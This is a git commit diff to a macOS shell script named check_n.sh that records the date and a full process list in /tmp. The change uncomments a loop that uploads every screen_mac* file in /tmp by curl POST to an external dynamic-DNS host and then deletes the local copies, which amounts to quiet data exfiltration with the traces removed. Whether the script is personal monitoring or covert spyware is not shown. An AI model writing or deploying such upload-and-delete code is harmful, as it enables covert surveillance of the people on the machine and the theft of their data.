de738850b648f7d77d7c9caec76958507463de92
Kirill Kochubey <kirill.kochubey@gmail.com>
2016-05-01 12:51:20 -0700

    Update check_n.sh

--- mac/check_n.sh
+++ mac/check_n.sh
@@ -3,12 +3,12 @@
 echo $(date) > /tmp/screen_mac_date.txt
 ps -ef > /tmp/screen_mac_000_psef.txt
 
-#find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
-#  echo "uploading $file"
-#  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
-#  # sleep 1
-#  rm $file 
-#done
+find /tmp/ -name screen_mac* -type f -print | while read -r file ; do 
+  echo "uploading $file"
+  curl -X POST --form file=@$file http://kk61676.ddns.net:3001/file || break
+  # sleep 1
+  rm $file 
+done
 
 read -r -d '' SCRCAP_KK << EOM2
 find /tmp/ -name screen_mac* -type f -print | while read -r file ; do
